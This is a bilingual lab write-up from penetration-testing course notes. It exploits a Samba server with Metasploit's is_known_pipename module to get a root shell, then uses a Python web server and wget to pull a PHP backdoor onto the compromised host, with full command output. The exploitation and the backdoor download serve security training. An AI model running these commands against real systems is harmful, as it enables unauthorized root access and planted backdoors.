---
layout: post
title: "Transferring Files To Linux Targets"
date: "2023-06-23"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Transferring Files To Linux Targets（将文件传输到Linux目标）
# Demo: Transferring Files To Linux Targets（演示：将文件传输到Linux目标）
We'll be exploring the process of how to transfer a file to a Linux target that you have compromised. This is going to be done in conjunction with the Python web server that we were able to set up.

We're going to start off by exploiting the target system or gaining access to it, after which we'll cover the process of how you can set up or how you can transfer a file to the Linux target system that you have just compromised, through the use of an in-built Linux utility or command.

Kali Linux : 192.196.45.2

Target IP Address : 192.196.45.3

The next step, will involve gaining access to the target system. In order to do that, we're going to firstly need perform a quick Nmap service version detection scan on the target. 

```
nmap -sV 192.196.45.3
```

tmux is a terminal multiplexer that allows you to have multiple terminal sessions within one terminal. 

```
tmux
```

The way it works is your terminal sessions or windows are highlighted at the bottom. They're ordered from 0 all the way to as many terminals as you open. And if you want to create a new one, you can do that by utilizing the keyboard combination `Ctrl+B` or you can just type in `Ctrl+B` or hold the keys there. `Ctrl+B+C`. And that will open up a new terminal session. And the current terminal that you're active on is denoted by the asterisk symbol. I'm currently in the terminal session 1 here. If I wanted to go back to terminal session 0, I can say `Ctrl+B+0`. I'm back on that session. If you want to create a new terminal window, just `Ctrl+B+C`. And once you want to exit out of a terminal session, you just type in `exit`. And it'll close it up, and I can go back into terminal 1. And I can `exit` from that one as well.

We're currently within the terminal session 0. 

session 0

```
msfconsole
setg RHOSTS 192.196.45.3
```

To scroll through a list with tmux, you can't use your mouse scroll wheel. You have to use the `Ctrl+B` option. And then you can utilize your `PageUp` and `PageDown` keys on your keyboard.

That will allow us to load a custom Linux shared object and then execute it in order to receive a meterpreter session.

Once you're done scrolling, hit the `Q` key on your keyboard, and that will allow you to type into your terminal.

```
use exploit/linux/samba/is_known_pipename
show options
exploit
```

Open up a bash session here. Because it's opened up the command shell session, and it is non-interactive.

```
/bin/bash -i
id
cat /etc/*release
pwd
```

We're currently within the `/tmp` directory. And we are going to be transferring our files to this directory.

How do we download a file onto the target system without meterpreter? This is where the tmux comes into play. We're going to open up a new terminal session. So we just type in `Ctrl+B`, so I'll just say `Ctrl+B+C`. And that will open up a new terminal. And our previous session is still running, it's in terminal 0.

Within this terminal, this is where we'll be setting up our web server with Python.

session 1

```
cd /usr/share/webshells/php
ls
python3 -m http.server 80
```

We'll navigate to the terminal session 0, and we can do that by saying `Ctrl+B+0`.

session 0

How do we transfer the file or how do we download it? We can download a file onto a Linux target through the use of the wget utility.

```
wget http://192.196.45.2/php-backdoor.php
```

```
ls
```

That is how to transfer files onto a Linux target system using the `wget` utility.

We can also take a look at a few other examples.

`Ctrl+B+1` to navigate to my terminal session 1. And I can transfer any other file that I would like to transfer.

session 1

```
cd /root
echo "this is some test text" > test.txt
cat test.txt
python3 -m http.server 80
```

`Ctrl+B+0`: we can utilize the wget utility.

session 0

```
wget http://192.196.45.2/test.txt
```

```
ls
cat test.txt
```

That is how you can transfer files to a Linux target system without the need of a meterpreter session.

You should have an understanding of how to transfer files onto a Windows target as well as a Linux target and how to set up a web server with Python to host the files that you'd like to transfer.

# Transferring Files To Linux Targets
## Overview
Goal

This lab covers the process of transferring files to Linux targets by leveraging a web server running on the Kali linux system.

# 将文件传输到 Linux 目标
## 概述
目标

本实验介绍了利用 Kali Linux 系统上运行的 Web 服务器将文件传输到 Linux 目标的过程。

## 复现视频内容
Kali Linux : 192.34.83.2

Target IP Address : 192.34.83.3

```
root@attackdefense:~# nmap -sV 192.34.83.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-06-23 03:12 UTC
Nmap scan report for target-1 (192.34.83.3)
Host is up (0.0000090s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:42:C0:22:53:03 (Unknown)
Service Info: Host: VICTIM-1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.58 seconds
```

[About tmux](https://github.com/tmux/tmux/wiki/Getting-Started)

前缀键

一旦连接了 tmux 客户端，任何输入的按键都会被转发到当前窗口中活动面板中运行的程序。对于控制 tmux 自身的按键，必须先按下特殊的键 - 这称为前缀键。

默认的前缀键是 C-b，表示 Ctrl 键和 b 键。在 tmux 中，修饰键通过在键前加上 C- 表示控制键，M- 表示元键（通常是现代计算机上的 Alt 键）和 S- 表示 shift 键。它们可以组合在一起，因此 C-M-x 表示同时按下控制键、元键和 x 键。

当按下前缀键时，tmux 等待另一个按键，这决定了执行哪个 tmux 命令。这样的按键在这里用空格隔开：C-b c 表示先按下前缀键 C-b，然后释放它，然后按下 c 键。如果需要，在按下 C-b 后必须小心释放 Ctrl 键 - C-b c 与 C-b C-c 不同。

连续按两次 C-b 将 C-b 键发送到活动面板中运行的程序。

session 0

```
root@attackdefense:~# service postgresql start && msfconsole -q
[ ok ] Starting PostgreSQL 11 database server: main.
msf5 > setg RHOSTS 192.34.83.3
RHOSTS => 192.34.83.3
msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > show options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS          192.34.83.3      yes       The target address range or CIDR identifier                                                                  
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share                                                          
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory                                                   


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)


msf5 exploit(linux/samba/is_known_pipename) > exploit

[*] 192.34.83.3:445 - Using location \\192.34.83.3\exploitable\tmp for the path                                                                            [*] 192.34.83.3:445 - Retrieving the remote path of the share 'exploitable'[*] 192.34.83.3:445 - Share 'exploitable' has server-side path '/[*] 192.34.83.3:445 - Uploaded payload to \\192.34.83.3\exploitable\tmp\JZvgnZjz.so                                                                        [*] 192.34.83.3:445 - Loading the payload from server-side path /tmp/JZvgnZjz.so using \\PIPE\/tmp/JZvgnZjz.so...                                          [-] 192.34.83.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.34.83.3:445 - Loading the payload from server-side path /tmp/JZvgnZjz.so using /tmp/JZvgnZjz.so...                                                 
[+] 192.34.83.3:445 - Probe response indicates the interactive payload was loaded...                                                                       
[*] Found shell.
[*] Command shell session 1 opened (192.34.83.2:43969 -> 192.34.83.3:445) at 2023-06-23 03:34:49 +0000 
```

```
/bin/bash -i                                                                                                                                                
bash: cannot set terminal process group (8): Inappropriate ioctl for device                                                                                 
bash: no job control in this shell                                                                                                                          
root@victim-1:/tmp# id                                                                                                                                      
id                                                                                                                                                          
uid=0(root) gid=0(root) groups=0(root)                                                                                                                     
root@victim-1:/tmp# cat /etc/*release
cat /etc/*release
PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
NAME="Debian GNU/Linux"
VERSION_ID="8"
VERSION="8 (jessie)"
ID=debian
HOME_URL="http://www.debian.org/"
SUPPORT_URL="http://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
root@victim-1:/tmp# pwd
pwd
/tmp
root@victim-1:/tmp# 
```

`Ctrl+b c`

session 1

```
root@attackdefense:~# cd /usr/share/webshells/php
root@attackdefense:/usr/share/webshells/php# lsfindsock.c  php-backdoor.php  php-findsock-shell.php  php-reverse-shell.php  qsd-php-backdoor.php  simple-backdoor.phproot@attackdefense:/usr/share/webshells/php# python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

`Ctrl+b 0`

session 0

```
root@victim-1:/tmp# wget http://192.34.83.2/php-backdoor.php
wget http://192.34.83.2/php-backdoor.php
converted 'http://192.34.83.2/php-backdoor.php' (ANSI_X3.4-1968) -> 'http://192.34.83.2/php-backdoor.php' (UTF-8)
--2023-06-23 03:45:46--  http://192.34.83.2/php-backdoor.php
Connecting to 192.34.83.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2800 (2.7K) [application/octet-stream]
Saving to: 'php-backdoor.php'

     0K ..                                                    100%  611M=0s

2023-06-23 03:45:46 (611 MB/s) - 'php-backdoor.php' saved [2800/2800]

root@victim-1:/tmp# ls
ls
php-backdoor.php
```

Example 2

`Ctrl+b 1`

session 1

`Ctrl+b cc`

```
root@attackdefense:/usr/share/webshells/php# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.34.83.3 - - [23/Jun/2023 03:45:46] "GET /php-backdoor.php HTTP/1.1" 200 -
^C                
Keyboard interrupt received, exiting.
```

```
root@attackdefense:/usr/share/webshells/php# cd /root
root@attackdefense:~# echo "this is some test text" > test.txt
root@attackdefense:~# cat test.txt
this is some test text
root@attackdefense:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

`Ctrl+b 0`

session 0

```
root@victim-1:/tmp# wget http://192.34.83.2/test.txt
wget http://192.34.83.2/test.txt
converted 'http://192.34.83.2/test.txt' (ANSI_X3.4-1968) -> 'http://192.34.83.2/test.txt' (UTF-8)
--2023-06-23 03:52:37--  http://192.34.83.2/test.txt
Connecting to 192.34.83.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 23 [text/plain]
Saving to: 'test.txt'

     0K                                                       100% 4.57M=0s

2023-06-23 03:52:37 (4.57 MB/s) - 'test.txt' saved [23/23]

root@victim-1:/tmp# ls
ls
php-backdoor.php
test.txt
root@victim-1:/tmp# cat test.txt
cat test.txt
this is some test text
```